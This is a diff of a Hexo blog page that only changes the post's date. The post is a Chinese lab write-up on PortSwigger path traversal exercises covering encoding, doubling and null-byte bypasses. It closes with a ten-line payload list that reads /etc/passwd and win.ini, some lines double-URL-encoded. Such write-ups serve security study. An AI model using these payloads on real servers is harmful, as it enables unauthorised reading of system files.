@@ -9,29 +9,29 @@
     <meta name="description" content="1. 漏洞实验1.1 实验：路径穿越漏洞路径穿越漏洞的最基本利用，利用..&#x2F;..&#x2F;进入系统目录读取文件。  1.2 实验：绝对路径绕过按照刚才的方法进行目录穿越，显示没有此文件，说明代码中做了目录穿越限制。  可能禁用了..&#x2F;防止目录穿越，可以用绝对路径进行绕过。  1.3 实验：双重注入绕过在请求37.jpg图片时，使用..&#x2F;..&#x2F;进行路径穿越，">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PortSwigger Path Traversal">
-<meta property="og:url" content="http://example.com/2026/02/24/PortSwigger-Path-Traversal/index.html">
+<meta property="og:url" content="http://example.com/2026/02/23/PortSwigger-Path-Traversal/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="1. 漏洞实验1.1 实验：路径穿越漏洞路径穿越漏洞的最基本利用，利用..&#x2F;..&#x2F;进入系统目录读取文件。  1.2 实验：绝对路径绕过按照刚才的方法进行目录穿越，显示没有此文件，说明代码中做了目录穿越限制。  可能禁用了..&#x2F;防止目录穿越，可以用绝对路径进行绕过。  1.3 实验：双重注入绕过在请求37.jpg图片时，使用..&#x2F;..&#x2F;进行路径穿越，">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2026/02/24/PortSwigger-Path-Traversal/1771938689325.png">
-<meta property="og:image" content="http://example.com/2026/02/24/PortSwigger-Path-Traversal/1771938892401.png">
-<meta property="og:image" content="http://example.com/2026/02/24/PortSwigger-Path-Traversal/1771938983492.png">
-<meta property="og:image" content="http://example.com/2026/02/24/PortSwigger-Path-Traversal/1771939123158.png">
-<meta property="og:image" content="http://example.com/2026/02/24/PortSwigger-Path-Traversal/1771939311503.png">
-<meta property="og:image" content="http://example.com/2026/02/24/PortSwigger-Path-Traversal/1771939811586.png">
-<meta property="og:image" content="http://example.com/2026/02/24/PortSwigger-Path-Traversal/1771939937128.png">
-<meta property="og:image" content="http://example.com/2026/02/24/PortSwigger-Path-Traversal/1771939985890.png">
-<meta property="og:image" content="http://example.com/2026/02/24/PortSwigger-Path-Traversal/1771946751964.png">
-<meta property="og:image" content="http://example.com/2026/02/24/PortSwigger-Path-Traversal/1771946894324.png">
-<meta property="og:image" content="http://example.com/2026/02/24/PortSwigger-Path-Traversal/1771947339760.png">
-<meta property="og:image" content="http://example.com/2026/02/24/PortSwigger-Path-Traversal/1771949032581.png">
-<meta property="og:image" content="http://example.com/2026/02/24/PortSwigger-Path-Traversal/1771949076527.png">
-<meta property="article:published_time" content="2026-02-24T13:06:45.000Z">
-<meta property="article:modified_time" content="2026-02-24T16:16:52.450Z">
+<meta property="og:image" content="http://example.com/2026/02/23/PortSwigger-Path-Traversal/1771938689325.png">
+<meta property="og:image" content="http://example.com/2026/02/23/PortSwigger-Path-Traversal/1771938892401.png">
+<meta property="og:image" content="http://example.com/2026/02/23/PortSwigger-Path-Traversal/1771938983492.png">
+<meta property="og:image" content="http://example.com/2026/02/23/PortSwigger-Path-Traversal/1771939123158.png">
+<meta property="og:image" content="http://example.com/2026/02/23/PortSwigger-Path-Traversal/1771939311503.png">
+<meta property="og:image" content="http://example.com/2026/02/23/PortSwigger-Path-Traversal/1771939811586.png">
+<meta property="og:image" content="http://example.com/2026/02/23/PortSwigger-Path-Traversal/1771939937128.png">
+<meta property="og:image" content="http://example.com/2026/02/23/PortSwigger-Path-Traversal/1771939985890.png">
+<meta property="og:image" content="http://example.com/2026/02/23/PortSwigger-Path-Traversal/1771946751964.png">
+<meta property="og:image" content="http://example.com/2026/02/23/PortSwigger-Path-Traversal/1771946894324.png">
+<meta property="og:image" content="http://example.com/2026/02/23/PortSwigger-Path-Traversal/1771947339760.png">
+<meta property="og:image" content="http://example.com/2026/02/23/PortSwigger-Path-Traversal/1771949032581.png">
+<meta property="og:image" content="http://example.com/2026/02/23/PortSwigger-Path-Traversal/1771949076527.png">
+<meta property="article:published_time" content="2026-02-23T13:06:45.000Z">
+<meta property="article:modified_time" content="2026-02-24T16:54:48.752Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="lfi">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2026/02/24/PortSwigger-Path-Traversal/1771938689325.png">
+<meta name="twitter:image" content="http://example.com/2026/02/23/PortSwigger-Path-Traversal/1771938689325.png">
     
     
       
@@ -112,17 +112,17 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/02/24/PortSwigger-Path-Traversal/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/02/24/PortSwigger-Path-Traversal/&text=PortSwigger Path Traversal"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/02/24/PortSwigger-Path-Traversal/&title=PortSwigger Path Traversal"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/02/24/PortSwigger-Path-Traversal/&is_video=false&description=PortSwigger Path Traversal"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=PortSwigger Path Traversal&body=Check out this article: http://example.com/2026/02/24/PortSwigger-Path-Traversal/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/02/24/PortSwigger-Path-Traversal/&title=PortSwigger Path Traversal"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/02/24/PortSwigger-Path-Traversal/&title=PortSwigger Path Traversal"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/02/24/PortSwigger-Path-Traversal/&title=PortSwigger Path Traversal"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/02/24/PortSwigger-Path-Traversal/&title=PortSwigger Path Traversal"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/02/24/PortSwigger-Path-Traversal/&name=PortSwigger Path Traversal&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/02/24/PortSwigger-Path-Traversal/&t=PortSwigger Path Traversal"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/02/23/PortSwigger-Path-Traversal/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/02/23/PortSwigger-Path-Traversal/&text=PortSwigger Path Traversal"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/02/23/PortSwigger-Path-Traversal/&title=PortSwigger Path Traversal"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/02/23/PortSwigger-Path-Traversal/&is_video=false&description=PortSwigger Path Traversal"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PortSwigger Path Traversal&body=Check out this article: http://example.com/2026/02/23/PortSwigger-Path-Traversal/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/02/23/PortSwigger-Path-Traversal/&title=PortSwigger Path Traversal"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/02/23/PortSwigger-Path-Traversal/&title=PortSwigger Path Traversal"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/02/23/PortSwigger-Path-Traversal/&title=PortSwigger Path Traversal"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/02/23/PortSwigger-Path-Traversal/&title=PortSwigger Path Traversal"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/02/23/PortSwigger-Path-Traversal/&name=PortSwigger Path Traversal&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/02/23/PortSwigger-Path-Traversal/&t=PortSwigger Path Traversal"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -154,7 +154,7 @@
       
     <div class="postdate">
       
-        <time datetime="2026-02-24T13:06:45.000Z" class="dt-published" itemprop="datePublished">2026-02-24</time>
+        <time datetime="2026-02-23T13:06:45.000Z" class="dt-published" itemprop="datePublished">2026-02-23</time>
         
       
     </div>
@@ -175,32 +175,32 @@
 
   <div class="content e-content" itemprop="articleBody">
     <h2 id="1-漏洞实验"><a href="#1-漏洞实验" class="headerlink" title="1. 漏洞实验"></a>1. 漏洞实验</h2><h3 id="1-1-实验：路径穿越漏洞"><a href="#1-1-实验：路径穿越漏洞" class="headerlink" title="1.1 实验：路径穿越漏洞"></a>1.1 实验：路径穿越漏洞</h3><p>路径穿越漏洞的最基本利用，利用..&#x2F;..&#x2F;进入系统目录读取文件。</p>
-<p><img src="/2026/02/24/PortSwigger-Path-Traversal/1771938689325.png" alt="1771938689325"></p>
+<p><img src="/2026/02/23/PortSwigger-Path-Traversal/1771938689325.png" alt="1771938689325"></p>
 <h3 id="1-2-实验：绝对路径绕过"><a href="#1-2-实验：绝对路径绕过" class="headerlink" title="1.2 实验：绝对路径绕过"></a>1.2 实验：绝对路径绕过</h3><p>按照刚才的方法进行目录穿越，显示没有此文件，说明代码中做了目录穿越限制。</p>
-<p><img src="/2026/02/24/PortSwigger-Path-Traversal/1771938892401.png" alt="1771938892401"></p>
+<p><img src="/2026/02/23/PortSwigger-Path-Traversal/1771938892401.png" alt="1771938892401"></p>
 <p>可能禁用了..&#x2F;防止目录穿越，可以用绝对路径进行绕过。</p>
-<p><img src="/2026/02/24/PortSwigger-Path-Traversal/1771938983492.png" alt="1771938983492"></p>
+<p><img src="/2026/02/23/PortSwigger-Path-Traversal/1771938983492.png" alt="1771938983492"></p>
 <h3 id="1-3-实验：双重注入绕过"><a href="#1-3-实验：双重注入绕过" class="headerlink" title="1.3 实验：双重注入绕过"></a>1.3 实验：双重注入绕过</h3><p>在请求37.jpg图片时，使用..&#x2F;..&#x2F;进行路径穿越，仍然可以正常请求，非常可能使用了类replace()函数替换为空。</p>
-<p><img src="/2026/02/24/PortSwigger-Path-Traversal/1771939123158.png" alt="1771939123158"></p>
+<p><img src="/2026/02/23/PortSwigger-Path-Traversal/1771939123158.png" alt="1771939123158"></p>
 <p>直接进行双写，..&#x2F;..&#x2F;变为….&#x2F;&#x2F;….&#x2F;&#x2F;，服务端将..&#x2F;替换为空之后，刚好得到..&#x2F;..&#x2F;进行路径穿越。</p>
-<p><img src="/2026/02/24/PortSwigger-Path-Traversal/1771939311503.png" alt="1771939311503"></p>
+<p><img src="/2026/02/23/PortSwigger-Path-Traversal/1771939311503.png" alt="1771939311503"></p>
 <h3 id="1-4-实验：双重编码绕过"><a href="#1-4-实验：双重编码绕过" class="headerlink" title="1.4 实验：双重编码绕过"></a>1.4 实验：双重编码绕过</h3><p>经过测试，对filename文件名进行两次URL编码之后可以正常请求文件。</p>
 <p>猜测是在过滤判断的时候进行一次URL解码，在正式接受参数的时候进行了一次URL解码。</p>
-<p><img src="/2026/02/24/PortSwigger-Path-Traversal/1771939811586.png" alt="1771939811586"></p>
+<p><img src="/2026/02/23/PortSwigger-Path-Traversal/1771939811586.png" alt="1771939811586"></p>
 <p>经过测试，使用..&#x2F;..&#x2F;进行目录穿越失败，单次URL编码同样失败。</p>
-<p><img src="/2026/02/24/PortSwigger-Path-Traversal/1771939937128.png" alt="1771939937128"></p>
+<p><img src="/2026/02/23/PortSwigger-Path-Traversal/1771939937128.png" alt="1771939937128"></p>
 <p>使用两次URL编码绕过成功。</p>
-<p><img src="/2026/02/24/PortSwigger-Path-Traversal/1771939985890.png" alt="1771939985890"></p>
+<p><img src="/2026/02/23/PortSwigger-Path-Traversal/1771939985890.png" alt="1771939985890"></p>
 <h3 id="1-5-实验：起始路径验证"><a href="#1-5-实验：起始路径验证" class="headerlink" title="1.5 实验：起始路径验证"></a>1.5 实验：起始路径验证</h3><p>服务端会验证起始路径是否为&#x2F;var&#x2F;www&#x2F;images&#x2F;。</p>
-<p><img src="/2026/02/24/PortSwigger-Path-Traversal/1771946751964.png" alt="1771946751964"></p>
+<p><img src="/2026/02/23/PortSwigger-Path-Traversal/1771946751964.png" alt="1771946751964"></p>
 <p>结合起始路径&#x2F;var&#x2F;www&#x2F;images&#x2F;和..&#x2F;..&#x2F;进行路径穿越。</p>
-<p><img src="/2026/02/24/PortSwigger-Path-Traversal/1771946894324.png" alt="1771946894324"></p>
+<p><img src="/2026/02/23/PortSwigger-Path-Traversal/1771946894324.png" alt="1771946894324"></p>
 <h3 id="1-6-实验：空字节扩展名"><a href="#1-6-实验：空字节扩展名" class="headerlink" title="1.6 实验：空字节扩展名"></a>1.6 实验：空字节扩展名</h3><p>服务端有后缀名校验，必须是.jpg后缀，可以用%00空字节截断后缀名。</p>
-<p><img src="/2026/02/24/PortSwigger-Path-Traversal/1771947339760.png" alt="1771947339760"></p>
+<p><img src="/2026/02/23/PortSwigger-Path-Traversal/1771947339760.png" alt="1771947339760"></p>
 <h2 id="2-总结思考"><a href="#2-总结思考" class="headerlink" title="2. 总结思考"></a>2. 总结思考</h2><h3 id="2-1-过滤规则编写"><a href="#2-1-过滤规则编写" class="headerlink" title="2.1 过滤规则编写"></a>2.1 过滤规则编写</h3><p>添加一条规则用于过滤路径穿越漏洞。</p>
-<p><img src="/2026/02/24/PortSwigger-Path-Traversal/1771949032581.png" alt="1771949032581"></p>
+<p><img src="/2026/02/23/PortSwigger-Path-Traversal/1771949032581.png" alt="1771949032581"></p>
 <p>之后筛选漏洞点就变得很容易了。</p>
-<p><img src="/2026/02/24/PortSwigger-Path-Traversal/1771949076527.png" alt="1771949076527"></p>
+<p><img src="/2026/02/23/PortSwigger-Path-Traversal/1771949076527.png" alt="1771949076527"></p>
 <h3 id="2-2-生成注入字典"><a href="#2-2-生成注入字典" class="headerlink" title="2.2 生成注入字典"></a>2.2 生成注入字典</h3><p>生成Linux、Windows的注入测试字典，其实一共就10行，主要还是靠手动测试。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">../../../../../../../etc/passwd</span><br><span class="line">/etc/passwd</span><br><span class="line">....//....//....//....//....//....//....//etc/passwd</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34</span></span><br><span class="line">../../../../../../../windows/win.ini</span><br><span class="line">c:\\windows\\win.ini</span><br><span class="line">....//....//....//....//....//....//....//windows/win.ini</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">25%36%33%25%33%61%25%35%63%25%35%63%25%37%37%25%36%39%25%36%65%25%36%34%25%36%66%25%37%37%25%37%33%25%35%63%25%35%63%25%37%37%25%36%39%25%36%65%25%32%65%25%36%39%25%36%65%25%36%39</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%37%37%25%36%39%25%36%65%25%36%34%25%36%66%25%37%37%25%37%33%25%32%66%25%37%37%25%36%39%25%36%65%25%32%65%25%36%39%25%36%65%25%36%39</span></span><br></pre></td></tr></table></figure>
   </div>
@@ -235,17 +235,17 @@
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/02/24/PortSwigger-Path-Traversal/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/02/24/PortSwigger-Path-Traversal/&text=PortSwigger Path Traversal"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/02/24/PortSwigger-Path-Traversal/&title=PortSwigger Path Traversal"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/02/24/PortSwigger-Path-Traversal/&is_video=false&description=PortSwigger Path Traversal"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=PortSwigger Path Traversal&body=Check out this article: http://example.com/2026/02/24/PortSwigger-Path-Traversal/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/02/24/PortSwigger-Path-Traversal/&title=PortSwigger Path Traversal"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/02/24/PortSwigger-Path-Traversal/&title=PortSwigger Path Traversal"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/02/24/PortSwigger-Path-Traversal/&title=PortSwigger Path Traversal"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/02/24/PortSwigger-Path-Traversal/&title=PortSwigger Path Traversal"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/02/24/PortSwigger-Path-Traversal/&name=PortSwigger Path Traversal&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/02/24/PortSwigger-Path-Traversal/&t=PortSwigger Path Traversal"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/02/23/PortSwigger-Path-Traversal/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/02/23/PortSwigger-Path-Traversal/&text=PortSwigger Path Traversal"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/02/23/PortSwigger-Path-Traversal/&title=PortSwigger Path Traversal"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/02/23/PortSwigger-Path-Traversal/&is_video=false&description=PortSwigger Path Traversal"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PortSwigger Path Traversal&body=Check out this article: http://example.com/2026/02/23/PortSwigger-Path-Traversal/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/02/23/PortSwigger-Path-Traversal/&title=PortSwigger Path Traversal"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/02/23/PortSwigger-Path-Traversal/&title=PortSwigger Path Traversal"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/02/23/PortSwigger-Path-Traversal/&title=PortSwigger Path Traversal"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/02/23/PortSwigger-Path-Traversal/&title=PortSwigger Path Traversal"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/02/23/PortSwigger-Path-Traversal/&name=PortSwigger Path Traversal&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/02/23/PortSwigger-Path-Traversal/&t=PortSwigger Path Traversal"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
